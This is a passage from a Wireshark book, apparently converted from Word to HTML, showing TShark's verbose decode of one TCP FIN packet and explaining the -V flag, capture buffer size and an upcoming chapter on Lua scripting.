New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Header checksum: 0xc569</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[correct] [Good:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >True]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Bad:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >False]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Source: 192.168.1.127 (192.168.1.127)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Destination: 64.4.44.84 (64.4.44.84)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:244.6000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Source GeoIP: Unknown] [Destination GeoIP: Unknown]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Transmission Control Protocol, Src Port: 53707 (53707), Dst</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Port: https (443),</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Seq: 1, Ack: 1, Len: 0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:237.4000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Source port: 53707 (53707) Destination port: https (443) [Stream index: 0]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:94.5000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Sequence</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.3000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >number:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(relative sequence number) Acknowledgment</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >number:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(relative ack</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >number) Header length: 32</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >bytes</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Flags: 0x019 (FIN, PSH, ACK)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >000. &#8230;. &#8230;. = Reserved: Not set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;0 &#8230;. &#8230;. = Nonce: Not set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. 0&#8230; &#8230;. = Congestion Window Reduced (CWR): Not set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. .0.. &#8230;. = ECN-Echo: Not set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. ..0. &#8230;. = Urgent: Not set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. &#8230;1 &#8230;. = Acknowledgment: Set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. &#8230;. 1&#8230; = Push: Set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. &#8230;. .0.. = Reset: Not set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. &#8230;. ..0. = Syn: Not set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. &#8230;. &#8230;1 = Fin: Set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Expert Info (Chat/Sequence): Connection finish</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section130" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.1000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(FIN)]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:100.7000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Message: Connection finish (FIN)] [Severity level: Chat]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Group: Sequence]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section131" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:207.6000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Window size value: 41412 [Calculated window size: 41412]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark258" ></a><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Window size scaling factor: -1 (unknown)] Checksum: 0x1917 [validation disabled]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:259.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Good Checksum: False] [Bad Checksum: False]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Options: (12 bytes), No-Operation (NOP), No-Operation</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(NOP), Timestamps</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section132" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:287.8500pt;margin-left:94.3000pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >No-Operation (NOP) Type: 1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0&#8230; &#8230;. = Copy on fragmentation: No</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >.00. &#8230;. = Class: Control (0)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:70.9000pt;margin-left:65.5500pt;text-indent:57.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;0 0001 = Number: No-Operation (NOP) (1) No-Operation (NOP)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Type: 1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0&#8230; &#8230;. = Copy on fragmentation: No</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >.00. &#8230;. = Class: Control (0)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:57.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;0 0001 = Number: No-Operation (NOP) (1) Timestamps: TSval 1972083, TSecr 326665960</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Kind: Timestamp (8)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Length: 10</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:165.4500pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Timestamp value: 1972083 Timestamp echo reply: 326665960</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:11.6500pt;margin-right:8.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note that this is effectively what you see in the Wireshark GUI if you were to expand all the fields in the Packet Details pane. As you can imagine, with the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-V </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag set, any amount of network traffic will result in a fast-scrolling screen of capture output. If the volume of packets is too high to control, or if you discover packets are being dropped before they can be written to disk, remember that Wireshark allows you to change the buffer size. By default, the buffer is 2 MB for each</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >interface. Increasing the buffer offers more room to scroll back for packet review.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This concludes the introduction to TShark. For the majority of the chapters, we&#8217;ll use the GUI interface. </span><span><a href="#_bookmark601" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 8</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >delves deep into programming with Lua, the scripting language that enables you to extend Wireshark, both at the command line and in the GUI. We also 